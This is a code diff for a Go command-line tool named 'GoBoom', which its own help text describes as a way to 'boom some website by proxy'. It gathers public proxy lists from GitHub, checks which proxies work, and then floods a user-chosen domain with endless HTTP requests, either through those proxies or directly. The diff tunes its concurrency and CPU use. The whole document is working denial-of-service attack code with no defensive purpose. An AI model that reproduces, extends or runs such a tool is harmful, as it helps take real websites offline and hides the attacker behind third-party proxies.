@@ -9,6 +9,7 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"runtime"
 	"strconv"
 	"strings"
 	"sync"
@@ -18,20 +19,21 @@ import (
 )
 
 var statusCodeToEscape = []string{
-	// "503 Too many open connections",
-	// "401 Unauthorized",
-	// "409 Conflict",
-	// "404 Not Found",
-	// "502 Bad Gateway",
-	// "504 Gateway Timeout",
-	// "407 Proxy Authentication Required",
-	// "400 Bad Request",
-	// "502 Proxy Error",
-	// "403 Forbidden",
-	// "503 Service Unavailable",
-	// "504 DNS Name Not Found",
-	// "407 Unauthorized",
-	// "405 Method Not Allowed",
+	//"503 Too many open connections",
+	"401 Unauthorized",
+	"409 Conflict",
+	"404 Not Found",
+	"502 Bad Gateway",
+	"504 Gateway Timeout",
+	"407 Proxy Authentication Required",
+	"400 Bad Request",
+	"502 Proxy Error",
+	"403 Forbidden",
+	//"503 Service Unavailable",
+	"504 DNS Name Not Found",
+	"407 Unauthorized",
+	"405 Method Not Allowed",
+	//"503 Service Temporarily Unavailable",
 }
 
 func getProxyList_github(link string) []string {
@@ -125,21 +127,6 @@ func getProxyList_file(path string) []string {
 	return strings.Split(proxy_list, "\n")
 }
 
-func chunkSlice(s []string, total_to_divided int) [][]string {
-	var divided [][]string
-	var chunk = float32(len(s) / total_to_divided)
-	var start, end = 0, 0
-	for i := 0; i < total_to_divided; i++ {
-		end = start + int(chunk)
-		if end > len(s) {
-			end = len(s)
-		}
-		divided = append(divided, s[start:end])
-		start = end
-	}
-	return divided
-}
-
 func stringInSlice(a string, list []string) bool {
 	for _, b := range list {
 		if b == a {
@@ -154,7 +141,10 @@ func handlerProxy(domain, proxy string) string {
 	//use proxy to connect
 	//format of proxy is ip:port
 	//format of domain is domain.com
+	mutex := &sync.Mutex{}
+	mutex.Lock()
 	proxyUrl, err := url.Parse("http://" + proxy)
+	mutex.Unlock()
 	if err != nil {
 		return "error"
 	}
@@ -167,7 +157,9 @@ func handlerProxy(domain, proxy string) string {
 	//client timeout after 1 second
 	client.Timeout = time.Millisecond * 1000
 	//connect to the website
+	mutex.Lock()
 	resp, err := client.Get("http://" + domain)
+	mutex.Unlock()
 	if err != nil {
 		return "error"
 	}
@@ -254,7 +246,7 @@ func test_proxy(proxy_file []string) []string {
 	proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt")...)
 	proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt")...)
 	proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt")...)
-	proxy_list = append(proxy_list, getProxyList_github("https://github.com/monosans/proxy-list/blob/main/proxies/http.txt")...)
+	proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt")...)
 
 	if len(proxy_file) > 0 {
 		for _, file := range proxy_file {
@@ -265,22 +257,17 @@ func test_proxy(proxy_file []string) []string {
 	//remove duplicate
 	proxy_list = removeDuplicates(proxy_list)
 	fmt.Println("Total proxy : ", len(proxy_list))
-	threads := 500
-	//chunk the list of proxy
-	proxy_list_chunk := chunkSlice(proxy_list, threads)
 	domain := "github.com"
 	wg2 := sync.WaitGroup{}
 	fmt.Println("Checking proxy...")
-	for _, proxy := range proxy_list_chunk {
+	for _, proxy := range proxy_list {
 		wg2.Add(1)
-		go func(proxy []string) {
+		go func(proxy string) {
 			defer wg2.Done()
-			for _, p := range proxy {
-				result := handlerProxy(domain, p)
-				//if more than 5 seconde, the proxy is not good
-				if result == "200 OK" || result == "200" {
-					good_proxy = add_good_proxy(p, good_proxy)
-				}
+			result := handlerProxy(domain, proxy)
+			//if more than 5 seconde, the proxy is not good
+			if result == "200 OK" || result == "200" {
+				good_proxy = add_good_proxy(proxy, good_proxy)
 			}
 		}(proxy)
 	}
@@ -289,10 +276,23 @@ func test_proxy(proxy_file []string) []string {
 	return good_proxy
 }
 
+func remove_proxy(proxy string, proxy_list []string) []string {
+	var mutex = &sync.Mutex{}
+	for i, p := range proxy_list {
+		if p == proxy {
+			mutex.Lock()
+			proxy_list = append(proxy_list[:i], proxy_list[i+1:]...)
+			mutex.Unlock()
+			break
+		}
+	}
+	return proxy_list
+}
+
 func main() {
 	parser := argparse.NewParser("GoBoom", "Boom some website by proxy")
 	domain := parser.String("d", "domain", &argparse.Options{Required: true, Help: "Domain to boom"})
-	threads := parser.String("t", "threads", &argparse.Options{Required: false, Help: "Number of threads", Default: "max"})
+	threads := parser.String("t", "threads", &argparse.Options{Required: false, Help: "Number of core to use", Default: "max"})
 	proxy_file := parser.StringList("p", "proxy-file", &argparse.Options{Required: false, Help: "Proxy file(s), separate with a ',' each files. Format of file(s) must be ip:port", Default: []string{}})
 	proxy_mult := parser.Int("x", "proxy-mult", &argparse.Options{Required: false, Help: "You can multiply the working proxys detected with this option", Default: 12})
 	mode := parser.Int("m", "mode", &argparse.Options{Required: false, Help: "Mode of attack, 1 for pass all traffic trough proxy, 2 don't use proxy", Default: 1})
@@ -304,6 +304,27 @@ func main() {
 	if !check_host_up(*domain) {
 		fmt.Println("The domain or ip is not up")
 		os.Exit(1)
+	}
+
+	//set max GOMAXPROCS
+	//detect the number of cpu
+	cpu := runtime.NumCPU()
+
+	//if threads superior to cpu convert to cpu
+	if *threads == "max" {
+		runtime.GOMAXPROCS(cpu)
+	} else {
+		threads_int, err := strconv.Atoi(*threads)
+		if err != nil {
+			fmt.Println("Error with threads")
+			os.Exit(1)
+		}
+		if threads_int > cpu {
+			runtime.GOMAXPROCS(cpu)
+		} else {
+			runtime.GOMAXPROCS(threads_int)
+			cpu = threads_int
+		}
 	}
 	//select mode 1 or 2
 	if *mode == 1 {
@@ -328,54 +349,50 @@ func main() {
 
 		//get the list of proxy
 		fmt.Println("Total proxy after multiplication :", len(proxy_list))
+		fmt.Println("Max process :", cpu)
 		fmt.Println("Starting attack in 5 seconds...")
 		time.Sleep(5 * time.Second)
-		threads_int := 10
-
-		if *threads != "max" {
-			threads_int, err = strconv.Atoi(*threads)
-			if err != nil {
-				fmt.Println("Error : threads must be a number")
-				os.Exit(1)
-			}
-		} else {
-			threads_int = len(proxy_list)
-		}
-		if threads_int > len(proxy_list) {
-			threads_int = len(proxy_list)
-			fmt.Println("Apply max threads")
-		}
-		//chunk the proxy list
-		chunked_proxy_list := chunkSlice(proxy_list, threads_int)
 		//start the threads
 		//create a channel list of good proxy
+		//mutex := &sync.Mutex{}
+		var wg sync.WaitGroup
+		// mutex := &sync.Mutex{}
+		// var to_remove []string
+		// var to_keep []string
 		for {
-			var wg sync.WaitGroup
-			for _, chunk := range chunked_proxy_list {
+			// if to_remove != nil {
+			// 	for _, proxy := range to_remove {
+			// 		proxy_list = remove_proxy(proxy, proxy_list)
+			// 	}
+			// // }
+			// proxy_list = append(proxy_list, to_keep...)
+			// to_remove = nil
+			// to_keep = nil
+			for _, proxy := range proxy_list {
 				wg.Add(1)
-				go func(chunk []string) {
-					defer wg.Done()
-					for _, proxy := range chunk {
-						for {
-							//time.Sleep(time.Millisecond * 100)
-							status := handlerProxy(*domain, proxy)
-							if status != "error" {
-								fmt.Println(status, "time :", time.Now().Format("15:04:05.000"))
-								continue
-							} else {
-								continue
-							}
-
-						}
-						//fmt.Println("Thread died")
-						//return
-					}
-				}(chunk)
+				go func(proxy string) {
+					status := handlerProxy(*domain, proxy)
+					fmt.Println(status + " : " + proxy + "	time :	" + time.Now().Format("15:04:05.000"))
+					//if status is error pop the proxy from the list
+					// if status == "error" {
+					// 	mutex.Lock()
+					// 	to_remove = append(to_remove, proxy)
+					// 	mutex.Unlock()
+					// } else {
+					// 	mutex.Lock()
+					// 	to_keep = append(to_keep, proxy)
+					// 	mutex.Unlock()
+					// }
+					wg.Done()
+				}(proxy)
 			}
 			wg.Wait()
-			fmt.Println("All threads are dead, restarting")
 		}
+
 	} else if *mode == 2 {
+		//set max core to use to max
+		cpu := runtime.NumCPU()
+		runtime.GOMAXPROCS(cpu)
 		threads_int, err := strconv.Atoi(*threads)
 		if err != nil {
 			fmt.Println("Error : threads must be a number")
@@ -387,16 +404,9 @@ func main() {
 				wg.Add(1)
 				go func() {
 					//use func handler
-					defer wg.Done()
-					for {
-						status := handler(*domain)
-						if status != "error" {
-							fmt.Println(status, "time :", time.Now().Format("15:04:05.000"))
-							continue
-						} else {
-							continue
-						}
-					}
+					status := handler(*domain)
+					fmt.Println(status, "time :", time.Now().Format("15:04:05.000"))
+					wg.Done()
 				}()
 			}
 			wg.Wait()
